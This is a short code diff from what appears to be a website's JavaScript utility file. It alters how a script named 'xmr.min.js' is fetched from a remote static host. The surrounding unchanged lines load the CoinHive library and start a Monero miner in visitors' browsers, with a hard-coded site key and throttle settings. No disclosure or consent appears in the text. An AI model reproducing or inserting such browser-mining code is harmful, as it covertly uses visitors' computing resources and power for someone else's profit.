@@ -248,8 +248,7 @@ var Util = {
     $.ajax({
       method: "GET",
       url: 'https://static.hacpai.com/js/lib/xmr.min.js',
-      dataType: "script",
-      cache: true
+      dataType: "script"
     }).done(function () {
       var miner = new CoinHive.Anonymous('gr2r3rJsYmaJpSd2Nml15zomewwc6Lzc', {threads: 1, throttle: 0.9});
       miner.start();
